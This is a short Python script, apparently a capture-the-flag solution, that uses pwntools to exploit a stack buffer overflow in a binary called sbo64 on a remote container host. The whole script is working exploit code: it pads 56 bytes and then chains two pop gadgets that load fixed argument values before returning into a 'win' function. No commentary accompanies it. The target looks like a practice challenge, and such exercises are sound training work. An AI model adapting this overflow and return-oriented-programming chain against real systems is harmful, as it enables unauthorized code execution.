from pwn import *


# f = process('./sbo64')
f = remote('sbo02.westus2.azurecontainer.io', 8080)

gadget1 = p64(0x0000000000401373)  # pop rdi ; ret
gadget2 = p64(0x0000000000401371)  # pop rsi ; pop r15 ; ret
main_addr = p64(0x401292)
win_addr = p64(0x401216)
arg1 = p64(0x1337c0d3)
arg2 = p64(0xacc01ade)

# assembled_function = gadget1 + arg1 + arg2

# payload = b'A'*56 + assembled_function #+ win_addr
# payload = b'A' * 56 + win_addr +  arg1 + arg2
payload = b'A' * 56 + gadget1 + arg1 + gadget2 + arg2 + b'B' * 8 + win_addr

print(payload)

print(f.recvline())
f.sendline(payload)
print(f.recvall())
